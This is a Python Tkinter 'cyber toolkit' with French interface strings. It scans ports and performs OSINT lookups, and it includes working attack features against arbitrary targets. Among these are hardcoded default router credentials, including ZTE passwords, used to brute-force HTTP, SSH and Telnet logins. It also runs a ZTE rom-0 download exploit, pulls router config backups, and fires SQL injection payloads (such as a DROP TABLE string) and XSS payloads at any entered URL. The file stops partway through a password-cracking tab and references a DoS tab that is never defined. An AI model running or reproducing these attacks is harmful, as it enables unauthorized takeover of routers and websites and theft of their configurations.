#!/usr/bin/env python3
import sys
import os
import socket
import threading
import time
import json
import subprocess
import requests
import whois
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
from urllib3.exceptions import InsecureRequestWarning
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# ──────────────────────── CONSTANTES ────────────────────────
DEFAULT_CREDS = {
    "zte": [("admin", "admin"), ("admin", "3UJUh2VemEfUtesEchEC2d2e"), ("admin", "Haikui_V2")],
    "dlink": [("admin", "admin"), ("admin", "")],
    "tplink": [("admin", "admin")],
    "generic": [("admin", "admin"), ("admin", "password"), ("root", "root")],
}

COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 993, 995, 1433, 1521,
                2049, 3306, 3389, 5432, 5900, 5901, 5985, 5986, 6379, 8080, 8443, 9090, 27017]

SERVICE_MAP = {21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS", 80: "HTTP",
               110: "POP3", 143: "IMAP", 443: "HTTPS", 445: "SMB", 993: "IMAPS",
               995: "POP3S", 1433: "MSSQL", 1521: "Oracle", 2049: "NFS", 3306: "MySQL",
               3389: "RDP", 5432: "PostgreSQL", 5900: "VNC", 6379: "Redis", 8080: "HTTP-Alt",
               8443: "HTTPS-Alt", 27017: "MongoDB"}


# ──────────────────────── FONCTIONS OUTILS ────────────────────────
def scan_port(ip, port, timeout=1):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        result = sock.connect_ex((ip, port))
        sock.close()
        return result == 0
    except:
        return False


def get_service_name(port):
    return SERVICE_MAP.get(port, "Unknown")


def resolve_target(target):
    try:
        return socket.gethostbyname(target)
    except:
        return target


# ──────────────────────── FENÊTRE PRINCIPALE ────────────────────────
class CyberAI(tk.Tk):
    def __init__(self):
        super().__init__()
        self.title("CyberAI - All-in-One Cyber Toolkit")
        self.geometry("1000x700")
        self.minsize(900, 600)

        style = ttk.Style()
        style.theme_use("clam")
        style.configure("TNotebook.Tab", padding=[14, 5], font=("TkDefaultFont", 10, "bold"))
        style.configure("TButton", padding=[8, 4], font=("TkDefaultFont", 10))
        style.configure("Success.TLabel", foreground="green", font=("TkDefaultFont", 10, "bold"))
        style.configure("Error.TLabel", foreground="red", font=("TkDefaultFont", 10, "bold"))
        style.configure("Warning.TLabel", foreground="orange", font=("TkDefaultFont", 10))

        notebook = ttk.Notebook(self)
        notebook.pack(fill=tk.BOTH, expand=True, padx=8, pady=8)

        tabs = {
            " Network ":   NetworkTab,
            " Router ":    RouterTab,
            " Web ":       WebTab,
            " OSINT ":     OSINTTab,
            " Password ":  PasswordTab,
            " DoS ":       DoSTab,
        }

        for name, cls in tabs.items():
            frame = ttk.Frame(notebook)
            notebook.add(frame, text=name)
            cls(frame, self)

        self.protocol("WM_DELETE_WINDOW", self._on_close)

    def _on_close(self):
        self.destroy()


class BaseTab:
    def __init__(self, parent, app):
        self.parent = parent
        self.app = app

    def log(self, widget, msg, tag=None):
        widget.insert(tk.END, msg + "\n", tag)
        widget.see(tk.END)

    def clear(self, widget):
        widget.delete("1.0", tk.END)

    def run_thread(self, target):
        t = threading.Thread(target=target, daemon=True)
        t.start()

    def make_output(self, parent, height=16):
        frame = ttk.Frame(parent)
        frame.pack(fill=tk.BOTH, expand=True)

        btn_bar = ttk.Frame(frame)
        btn_bar.pack(fill=tk.X, pady=(0, 3))
        ttk.Button(btn_bar, text="Clear", command=lambda: self.clear(txt)).pack(side=tk.LEFT, padx=2)
        ttk.Button(btn_bar, text="Save Log", command=lambda: self.save_log(txt)).pack(side=tk.LEFT, padx=2)

        txt = scrolledtext.ScrolledText(frame, height=height, font=("Consolas", 9), state="normal")
        txt.pack(fill=tk.BOTH, expand=True)
        txt.tag_config("success", foreground="green")
        txt.tag_config("error", foreground="red")
        txt.tag_config("warning", foreground="orange")
        txt.tag_config("bold", font=("Consolas", 9, "bold"))
        return txt

    def save_log(self, widget):
        fname = filedialog.asksaveasfilename(defaultextension=".txt",
                                               filetypes=[("Text files", "*.txt"), ("All files", "*.*")])
        if not fname:
            return
        try:
            content = widget.get("1.0", tk.END)
            with open(fname, "w", encoding="utf-8") as f:
                f.write(content)
            messagebox.showinfo("Export", f"Log sauvegardé: {fname}")
        except Exception as e:
            messagebox.showerror("Erreur", f"Impossible de sauvegarder: {e}")


# ════════════════════════ 1. NETWORK SCANNER ════════════════════════
class NetworkTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="Port Scanner")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="Cible (IP/domaine):").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_target = ttk.Entry(f, width=35, font=("TkDefaultFont", 11))
        self.entry_target.grid(row=0, column=1, padx=5, pady=5)

        self.scan_type = tk.StringVar(value="common")
        ttk.Radiobutton(f, text="Ports courants", variable=self.scan_type, value="common").grid(row=0, column=2, padx=2)
        ttk.Radiobutton(f, text="1-1024", variable=self.scan_type, value="quick").grid(row=0, column=3, padx=2)
        ttk.Radiobutton(f, text="1-65535", variable=self.scan_type, value="full").grid(row=0, column=4, padx=2)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=1, column=0, columnspan=5, pady=5)
        ttk.Button(btn_frame, text="Scan", command=self.run_scan).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="Ping", command=self.run_ping).pack(side=tk.LEFT, padx=5)
        ttk.Button(btn_frame, text="My IP", command=self.run_my_ip).pack(side=tk.LEFT, padx=5)

        mac_frame = ttk.LabelFrame(main, text="MAC Address Lookup")
        mac_frame.pack(fill=tk.X, pady=(0, 8))
        ttk.Label(mac_frame, text="Adresse MAC:").pack(side=tk.LEFT, padx=5, pady=5)
        self.entry_mac = ttk.Entry(mac_frame, width=20, font=("TkDefaultFont", 11))
        self.entry_mac.pack(side=tk.LEFT, padx=5, pady=5)
        ttk.Button(mac_frame, text="Lookup", command=self.run_mac_lookup).pack(side=tk.LEFT, padx=5, pady=5)

        self.output = self.make_output(main)

    def run_scan(self):
        self.clear(self.output)
        target = self.entry_target.get().strip()
        if not target:
            messagebox.showwarning("Attention", "Entrez une cible.")
            return
        self.run_thread(lambda: self.do_scan(target))

    def do_scan(self, target):
        ip = resolve_target(target)
        self.log(self.output, f"Cible: {target} \u2192 {ip}", "bold")
        self.log(self.output, f"Scan en cours...\n")

        ports = COMMON_PORTS if self.scan_type.get() == "common" else list(range(1, 1025 if self.scan_type.get() == "quick" else 65536))

        open_ports = []
        def check(p):
            if scan_port(ip, p):
                open_ports.append(p)

        with ThreadPoolExecutor(max_workers=100) as pool:
            pool.map(check, ports)

        open_ports.sort()
        if open_ports:
            self.log(self.output, f"{'PORT':>7}  {'SERVICE':<12}  STATUS")
            self.log(self.output, "-" * 35)
            for p in open_ports:
                self.log(self.output, f"{p:>7}/TCP  {get_service_name(p):<12}  ouvert", "success")
        else:
            self.log(self.output, "Aucun port ouvert trouvé.", "warning")

    def run_ping(self):
        self.clear(self.output)
        target = self.entry_target.get().strip()
        if not target:
            messagebox.showwarning("Attention", "Entrez une cible.")
            return
        self.run_thread(lambda: self.do_ping(target))

    def do_ping(self, target):
        self.log(self.output, f"Ping {target}...", "bold")
        param = "-n" if os.name == "nt" else "-c"
        result = subprocess.run(["ping", param, "3", target], capture_output=True, text=True, timeout=10)
        self.log(self.output, result.stdout)
        if result.returncode == 0:
            self.log(self.output, "\n\u2713 H\u00f4te joignable", "success")
        else:
            self.log(self.output, "\n\u2717 H\u00f4te injoignable", "error")

    def run_mac_lookup(self):
        self.clear(self.output)
        mac = self.entry_mac.get().strip()
        if not mac:
            messagebox.showwarning("Attention", "Entrez une adresse MAC.")
            return
        self.run_thread(lambda: self.do_mac_lookup(mac))

    def do_mac_lookup(self, mac):
        self.log(self.output, f"Recherche du fabricant pour {mac}...", "bold")
        try:
            r = requests.get(f"https://api.macvendors.com/{mac}", timeout=8)
            if r.status_code == 200:
                self.log(self.output, f"  Fabricant: {r.text.strip()}", "success")
            else:
                self.log(self.output, "  Fabricant non trouv\u00e9.", "warning")
        except Exception as e:
            self.log(self.output, f"  Erreur: {e}", "error")

    def run_my_ip(self):
        self.clear(self.output)
        self.run_thread(lambda: self.do_my_ip())

    def do_my_ip(self):
        self.log(self.output, "Recherche de votre IP publique...", "bold")
        try:
            r = requests.get("https://api.ipify.org?format=json", timeout=8)
            ip = r.json().get("ip", "inconnue")
            self.log(self.output, f"  IP publique: {ip}", "success")
            try:
                r2 = requests.get(f"http://ip-api.com/json/{ip}", timeout=8)
                data = r2.json()
                if data.get("status") == "success":
                    self.log(self.output, f"  FAI: {data.get('isp', 'N/A')}")
                    self.log(self.output, f"  Ville: {data.get('city', 'N/A')}, {data.get('country', 'N/A')}")
            except:
                pass
        except Exception as e:
            self.log(self.output, f"  Erreur: {e}", "error")


# ════════════════════════ 2. ROUTER EXPLOIT ════════════════════════
class RouterTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="Router Testing")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="IP:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_ip = ttk.Entry(f, width=20, font=("TkDefaultFont", 11))
        self.entry_ip.grid(row=0, column=1, padx=5, pady=5)

        ttk.Label(f, text="Port:").grid(row=0, column=2, padx=5, pady=5, sticky="w")
        self.entry_port = ttk.Spinbox(f, from_=1, to=65535, width=6, value=80)
        self.entry_port.grid(row=0, column=3, padx=5, pady=5)

        ttk.Label(f, text="Vendor:").grid(row=0, column=4, padx=5, pady=5, sticky="w")
        self.vendor = tk.StringVar(value="generic")
        ttk.Combobox(f, textvariable=self.vendor, values=list(DEFAULT_CREDS.keys()), width=10, state="readonly").grid(row=0, column=5, padx=5, pady=5)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=1, column=0, columnspan=6, pady=5)
        ttk.Button(btn_frame, text="Scan Ports", command=self.run_scan_ports).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Bruteforce", command=self.run_bruteforce).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Rom-0 Exploit", command=self.run_rom0).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Config Extract", command=self.run_config).pack(side=tk.LEFT, padx=3)

        self.output = self.make_output(main)

    def get_ip(self):
        ip = self.entry_ip.get().strip()
        if not ip:
            messagebox.showwarning("Attention", "Entrez une IP.")
            return None
        return ip

    def run_scan_ports(self):
        self.clear(self.output)
        ip = self.get_ip()
        if not ip:
            return
        self.run_thread(lambda: self.do_scan_ports(ip))

    def do_scan_ports(self, ip):
        self.log(self.output, f"Scan des ports sur {ip}...", "bold")
        targets = [22, 23, 80, 443, 8080, 8443]
        open_ports = []
        for p in targets:
            if scan_port(ip, p):
                open_ports.append(p)
                self.log(self.output, f"  Port {p} ({get_service_name(p)}) ouvert", "success")
        if not open_ports:
            self.log(self.output, "Aucun port int\u00e9ressant ouvert.", "warning")

    def run_bruteforce(self):
        self.clear(self.output)
        ip = self.get_ip()
        if not ip:
            return
        port = int(self.entry_port.get())
        self.run_thread(lambda: self.do_bruteforce(ip, port))

    def do_bruteforce(self, ip, port):
        vendor = self.vendor.get()
        creds = DEFAULT_CREDS.get(vendor, DEFAULT_CREDS["generic"])
        self.log(self.output, f"Bruteforce {ip}:{port} (vendor: {vendor})", "bold")
        self.log(self.output, f"Test de {len(creds)} identifiants...\n")

        for user, pwd in creds:
            try:
                if port == 80:
                    r = requests.get(f"http://{ip}:{port}/", auth=(user, pwd), timeout=5, verify=False)
                    if r.status_code == 200:
                        self.log(self.output, f"[HTTP] {user}:{pwd} \u2192 OK", "success")
                elif port == 22:
                    import paramiko
                    ssh = paramiko.SSHClient()
                    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    ssh.connect(ip, port=port, username=user, password=pwd, timeout=5, look_for_keys=False, allow_agent=False)
                    self.log(self.output, f"[SSH] {user}:{pwd} \u2192 OK", "success")
                    ssh.close()
                elif port == 23:
                    import telnetlib
                    tn = telnetlib.Telnet(ip, port, timeout=3)
                    tn.read_until(b"login:", timeout=2)
                    tn.write(user.encode() + b"\n")
                    tn.read_until(b"Password:", timeout=2)
                    tn.write(pwd.encode() + b"\n")
                    out = tn.read_until(b"#", timeout=2)
                    tn.close()
                    if b"#" in out or b"$" in out:
                        self.log(self.output, f"[Telnet] {user}:{pwd} \u2192 OK", "success")
            except:
                pass
        self.log(self.output, "\nBruteforce termin\u00e9.")

    def run_rom0(self):
        self.clear(self.output)
        ip = self.get_ip()
        if not ip:
            return
        port = int(self.entry_port.get())
        self.run_thread(lambda: self.do_rom0(ip, port))

    def do_rom0(self, ip, port):
        self.log(self.output, "T\u00e9l\u00e9chargement rom-0 (ZTE)...", "bold")
        try:
            r = requests.get(f"http://{ip}:{port}/rom-0", timeout=10, verify=False)
            if r.status_code == 200 and len(r.content) > 100:
                fname = f"rom0_{ip}.bin"
                with open(fname, "wb") as f:
                    f.write(r.content)
                self.log(self.output, f"rom-0 t\u00e9l\u00e9charg\u00e9: {fname} ({len(r.content)} octets)", "success")
            else:
                self.log(self.output, "rom-0 non accessible.", "warning")
        except Exception as e:
            self.log(self.output, f"Erreur: {e}", "error")

    def run_config(self):
        self.clear(self.output)
        ip = self.get_ip()
        if not ip:
            return
        port = int(self.entry_port.get())
        self.run_thread(lambda: self.do_config(ip, port))

    def do_config(self, ip, port):
        self.log(self.output, "Extraction configuration ZTE...", "bold")
        urls = [
            "/cgi-bin/DownloadCfg/RouterCfm.cfg",
            "/backupsettings.conf",
            "/config.bin",
        ]
        for path in urls:
            try:
                r = requests.get(f"http://{ip}:{port}{path}", timeout=10, verify=False)
                if r.status_code == 200 and len(r.content) > 50:
                    safe = path.replace("/", "_")
                    fname = f"config_{ip}{safe}"
                    with open(fname, "wb") as f:
                        f.write(r.content)
                    self.log(self.output, f"Config: {path} \u2192 {fname} ({len(r.content)} octets)", "success")
            except:
                pass


# ════════════════════════ 3. WEB TOOLS ════════════════════════
class WebTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="Web Security Testing")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="URL:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_url = ttk.Entry(f, width=70, font=("TkDefaultFont", 11))
        self.entry_url.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        f.columnconfigure(1, weight=1)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=1, column=0, columnspan=2, pady=5)
        ttk.Button(btn_frame, text="Headers", command=self.run_headers).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="SQLi Test", command=self.run_sqli).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="XSS Test", command=self.run_xss).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Phishing Detect", command=self.run_phishing).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Dir Bust", command=self.run_dirbust).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="SSL Check", command=self.run_ssl).pack(side=tk.LEFT, padx=3)

        self.output = self.make_output(main)

    def get_url(self):
        url = self.entry_url.get().strip()
        if not url:
            messagebox.showwarning("Attention", "Entrez une URL.")
            return None
        if not url.startswith("http"):
            url = "https://" + url
        return url

    def run_headers(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_headers(url))

    def do_headers(self, url):
        self.log(self.output, f"Analyse des headers: {url}", "bold")
        try:
            r = requests.get(url, timeout=10, verify=False)
            self.log(self.output, f"Status: {r.status_code}", "bold")
            for k, v in r.headers.items():
                tag = None
                if k.lower() in ("server", "x-powered-by"):
                    tag = "warning"
                self.log(self.output, f"  {k}: {v}", tag)
            sec_headers = ["strict-transport-security", "x-frame-options", "x-content-type-options",
                           "content-security-policy", "x-xss-protection"]
            self.log(self.output, "\nS\u00e9curit\u00e9 des headers:", "bold")
            for h in sec_headers:
                if h in {k.lower() for k in r.headers}:
                    self.log(self.output, f"  \u2713 {h}", "success")
                else:
                    self.log(self.output, f"  \u2717 {h} manquant", "error")
        except Exception as e:
            self.log(self.output, f"Erreur: {e}", "error")

    def run_sqli(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_sqli(url))

    def do_sqli(self, url):
        self.log(self.output, f"Test SQLi: {url}", "bold")
        payloads = ["'", "\"", "1' OR '1'='1", "1\" OR \"1\"=\"1", "' UNION SELECT 1,2,3--", "'; DROP TABLE users--"]
        errors = ["sql", "mysql", "syntax error", "unclosed", "quotation mark", "ODBC", "SQLite"]
        for p in payloads:
            try:
                r = requests.get(url + p, timeout=5, verify=False)
                for e in errors:
                    if e.lower() in r.text.lower():
                        self.log(self.output, f"  [!] Possible SQLi avec: {p}", "error")
                        break
            except:
                pass
        self.log(self.output, "Test SQLi termin\u00e9.")

    def run_xss(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_xss(url))

    def do_xss(self, url):
        self.log(self.output, f"Test XSS: {url}", "bold")
        payloads = ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "\"><script>alert(1)</script>"]
        for p in payloads:
            try:
                r = requests.get(url + p, timeout=5, verify=False)
                if p in r.text:
                    self.log(self.output, f"  [!] XSS r\u00e9fl\u00e9chie avec: {p[:40]}", "error")
                else:
                    self.log(self.output, f"  - {p[:30]}... non d\u00e9tect\u00e9", "success")
            except:
                pass
        self.log(self.output, "Test XSS termin\u00e9.")

    def run_phishing(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_phishing(url))

    def do_phishing(self, url):
        self.log(self.output, f"D\u00e9tection phishing: {url}", "bold")
        suspicious_words = ["login", "verify", "account", "secure", "update", "confirm", "signin", "bank", "paypal"]
        score = 0
        reasons = []
        if not url.startswith("https"):
            score += 20
            reasons.append("Pas de HTTPS")
        try:
            ip = socket.gethostbyname(url.split("//")[-1].split("/")[0])
            if ip:
                pass
        except:
            score += 15
            reasons.append("Domaine invalide")
        domain = url.split("//")[-1].split("/")[0]
        if domain.count(".") >= 3:
            score += 15
            reasons.append("Multiples sous-domaines")
        for w in suspicious_words:
            if w in url.lower():
                score += 10
                reasons.append(f"Mot suspect: {w}")
        if score >= 30:
            self.log(self.output, f"\u26a0 PHISHING probable ({score}%)", "error")
        elif score >= 15:
            self.log(self.output, f"\u26a0 Suspect ({score}%)", "warning")
        else:
            self.log(self.output, f"\u2713 Semble l\u00e9gitime ({score}%)", "success")
        for r in reasons:
            self.log(self.output, f"  \u2022 {r}")

    def run_dirbust(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_dirbust(url))

    def do_dirbust(self, url):
        self.log(self.output, f"Directory busting: {url}", "bold")
        common = ["admin", "login", "wp-admin", "backup", "config", ".git", ".env",
                  "phpinfo.php", "robots.txt", "sitemap.xml", "api", "uploads", "images"]
        base = url.rstrip("/")
        found = 0
        for d in common:
            try:
                r = requests.get(f"{base}/{d}", timeout=5, verify=False, allow_redirects=False)
                if r.status_code in (200, 301, 302, 403):
                    self.log(self.output, f"  [{r.status_code}] /{d}", "warning" if r.status_code != 403 else "success")
                    found += 1
            except:
                pass
        if found == 0:
            self.log(self.output, "Aucun r\u00e9pertoire sensible trouv\u00e9.", "success")

    def run_ssl(self):
        self.clear(self.output)
        url = self.get_url()
        if not url:
            return
        self.run_thread(lambda: self.do_ssl(url))

    def do_ssl(self, url):
        import ssl
        host = url.split("//")[-1].split("/")[0].split(":")[0]
        port = 443
        self.log(self.output, f"Analyse SSL pour {host}:{port}...", "bold")
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((host, port), timeout=8) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    cert = ssock.getpeercert()
                    self.log(self.output, f"  Sujet: {dict(cert['subject'][0]).get('commonName', 'N/A')}", "success")
                    self.log(self.output, f"  \u00c9metteur: {dict(cert['issuer'][0]).get('commonName', 'N/A')}")
                    self.log(self.output, f"  Version: TLS {cert.get('version', 'N/A')}")
                    self.log(self.output, f"  D\u00e9but: {cert.get('notBefore', 'N/A')}")
                    self.log(self.output, f"  Expiration: {cert.get('notAfter', 'N/A')}")
                    from datetime import datetime
                    exp = datetime.strptime(cert['notAfter'], "%b %d %H:%M:%S %Y %Z")
                    days = (exp - datetime.now()).days
                    if days < 0:
                        self.log(self.output, f"  \u26a0 Certificat EXPIR\u00c9 (il y a {-days} jours)", "error")
                    elif days < 30:
                        self.log(self.output, f"  \u26a0 Expire dans {days} jours", "warning")
                    else:
                        self.log(self.output, f"  \u2713 Valide encore {days} jours", "success")
                    sans = dict(cert['subjectAltName'][0]) if 'subjectAltName' in cert else {}
                    if sans:
                        self.log(self.output, f"  SAN: {cert['subjectAltName'][:5]}")
        except Exception as e:
            self.log(self.output, f"  Erreur SSL: {e}", "error")


# ════════════════════════ 4. OSINT ════════════════════════
class OSINTTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="OSINT Reconnaissance")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="Cible (domaine/IP):").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_target = ttk.Entry(f, width=40, font=("TkDefaultFont", 11))
        self.entry_target.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        f.columnconfigure(1, weight=1)

        btn_frame = ttk.Frame(f)
        btn_frame.grid(row=1, column=0, columnspan=2, pady=5)
        ttk.Button(btn_frame, text="Whois", command=self.run_whois).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="DNS Resolve", command=self.run_dns).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Port Scan", command=self.run_scan).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Full OSINT", command=self.run_full).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="Subdomains", command=self.run_subdomains).pack(side=tk.LEFT, padx=3)
        ttk.Button(btn_frame, text="GeoIP", command=self.run_geoip).pack(side=tk.LEFT, padx=3)

        self.output = self.make_output(main)

    def get_target(self):
        t = self.entry_target.get().strip()
        if not t:
            messagebox.showwarning("Attention", "Entrez un domaine ou IP.")
            return None
        return t

    def run_whois(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_whois(t))

    def do_whois(self, t):
        self.log(self.output, f"Whois pour {t}:", "bold")
        try:
            w = whois.whois(t)
            for field in ["registrar", "name", "org", "country", "creation_date", "expiration_date", "name_servers"]:
                val = w.get(field)
                if val:
                    self.log(self.output, f"  {field}: {val}")
        except Exception as e:
            self.log(self.output, f"Erreur whois: {e}", "error")

    def run_dns(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_dns(t))

    def do_dns(self, t):
        self.log(self.output, f"DNS resolution pour {t}:", "bold")
        try:
            ip = socket.gethostbyname(t)
            self.log(self.output, f"  IPv4: {ip}", "success")
            try:
                host = socket.gethostbyaddr(ip)
                self.log(self.output, f"  Hostname: {host[0]}")
            except:
                pass
        except:
            self.log(self.output, "  R\u00e9solution \u00e9chou\u00e9e", "error")

    def run_scan(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_scan(t))

    def do_scan(self, t):
        ip = resolve_target(t)
        self.log(self.output, f"Scan ports pour {ip}:", "bold")
        for p in [21, 22, 23, 25, 80, 110, 443, 445, 3306, 3389, 8080, 8443]:
            if scan_port(ip, p):
                self.log(self.output, f"  Port {p} ({get_service_name(p)}) ouvert", "success")

    def run_full(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_full(t))

    def do_full(self, t):
        self.log(self.output, f"=== OSINT Complet: {t} ===", "bold")
        ip = resolve_target(t)
        self.log(self.output, f"\n[IP] {ip}")
        try:
            w = whois.whois(t)
            self.log(self.output, f"\n[Whois] Registrar: {w.registrar}")
            self.log(self.output, f"          Country: {w.country}")
            self.log(self.output, f"          Created: {w.creation_date}")
        except:
            pass
        self.log(self.output, "\n[Ports]")
        for p in [21, 22, 23, 25, 80, 443, 445, 3306, 3389, 8080]:
            if scan_port(ip, p):
                self.log(self.output, f"  Port {p} ({get_service_name(p)}) ouvert", "success")
        self.log(self.output, "\n[HTTP]")
        try:
            r = requests.get(f"http://{ip}", timeout=5, verify=False)
            self.log(self.output, f"  Status: {r.status_code}")
            self.log(self.output, f"  Server: {r.headers.get('Server', 'N/A')}")
        except:
            self.log(self.output, "  Pas de r\u00e9ponse HTTP", "warning")

    # ── Subdomain Enumeration ──
    def run_subdomains(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_subdomains(t))

    def do_subdomains(self, t):
        self.log(self.output, f"Enum\u00e9ration de sous-domaines pour {t}...", "bold")
        wordlist = ["www", "mail", "ftp", "admin", "blog", "webmail", "forum", "shop",
                    "api", "dev", "test", "beta", "vpn", "remote", "portal", "support",
                    "wiki", "app", "cdn", "static", "assets", "img", "dns", "ns1", "ns2",
                    "smtp", "pop3", "imap", "mysql", "db", "backup", "git", "jenkins",
                    "jira", "confluence", "help", "status", "docs", "tracker", "cloud",
                    "mx1", "mx2", "cpanel", "whm", "server", "gateway", "firewall",
                    "proxy", "intranet", "owa", "exchange", "calendar", "drive",
                    "login", "register", "download", "upload", "media", "news"]
        found = []
        for sub in wordlist:
            domain = f"{sub}.{t}"
            try:
                ip = socket.gethostbyname(domain)
                found.append((domain, ip))
                self.log(self.output, f"  \u2713 {domain} \u2192 {ip}", "success")
            except:
                pass
        if not found:
            self.log(self.output, "  Aucun sous-domaine trouv\u00e9.", "warning")
        else:
            self.log(self.output, f"\nTotal: {len(found)} sous-domaine(s) trouv\u00e9(s).", "bold")

    # ── GeoIP Lookup ──
    def run_geoip(self):
        self.clear(self.output)
        t = self.get_target()
        if not t:
            return
        self.run_thread(lambda: self.do_geoip(t))

    def do_geoip(self, t):
        ip = resolve_target(t)
        self.log(self.output, f"G\u00e9olocalisation pour {ip}:", "bold")
        try:
            r = requests.get(f"http://ip-api.com/json/{ip}", timeout=8)
            if r.status_code == 200:
                data = r.json()
                if data.get("status") == "success":
                    self.log(self.output, f"  Pays: {data.get('country', 'N/A')}", "success")
                    self.log(self.output, f"  R\u00e9gion: {data.get('regionName', 'N/A')}")
                    self.log(self.output, f"  Ville: {data.get('city', 'N/A')}")
                    self.log(self.output, f"  ISP: {data.get('isp', 'N/A')}")
                    self.log(self.output, f"  Organisation: {data.get('org', 'N/A')}")
                    self.log(self.output, f"  Coordonn\u00e9es: {data.get('lat', '?')}, {data.get('lon', '?')}")
                else:
                    self.log(self.output, f"  Erreur API: {data.get('message', 'inconnue')}", "error")
            else:
                self.log(self.output, "  Service indisponible.", "error")
        except Exception as e:
            self.log(self.output, f"  Erreur: {e}", "error")


# ════════════════════════ 5. PASSWORD ANALYSIS ════════════════════════
class PasswordTab(BaseTab):
    def __init__(self, parent, app):
        super().__init__(parent, app)
        self.build()

    def build(self):
        main = ttk.Frame(self.parent)
        main.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)

        f = ttk.LabelFrame(main, text="Password Analysis")
        f.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(f, text="Mot de passe:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_pwd = ttk.Entry(f, show="*", width=40, font=("TkDefaultFont", 11))
        self.entry_pwd.grid(row=0, column=1, padx=5, pady=5)
        self.show_var = tk.BooleanVar()
        ttk.Checkbutton(f, text="Afficher", variable=self.show_var,
                        command=lambda: self.entry_pwd.config(show="" if self.show_var.get() else "*")
                        ).grid(row=0, column=2, padx=5)

        gen_frame = ttk.Frame(f)
        gen_frame.grid(row=1, column=0, columnspan=3, pady=5)
        ttk.Label(gen_frame, text="Longueur:").pack(side=tk.LEFT, padx=5)
        self.spin_len = ttk.Spinbox(gen_frame, from_=8, to=64, width=5, value=20)
        self.spin_len.pack(side=tk.LEFT, padx=5)
        ttk.Button(gen_frame, text="G\u00e9n\u00e9rer", command=self.run_generate).pack(side=tk.LEFT, padx=5)
        ttk.Button(gen_frame, text="Analyser", command=self.run_analyze).pack(side=tk.LEFT, padx=5)
        ttk.Button(gen_frame, text="G\u00e9n.Hash", command=self.run_generate_hash).pack(side=tk.LEFT, padx=5)

        hf = ttk.LabelFrame(main, text="Hash Cracker")
        hf.pack(fill=tk.X, pady=(0, 8))

        ttk.Label(hf, text="Hash:").grid(row=0, column=0, padx=5, pady=5, sticky="w")
        self.entry_hash = ttk.Entry(hf, width=50, font=("TkDefaultFont", 11))
        self.entry_hash.grid(row=0, column=1, padx=5, pady=5, sticky="ew")
        hf.columnconfigure(1, weight=1)

        self.hash_type = tk.StringVar(value="MD5")
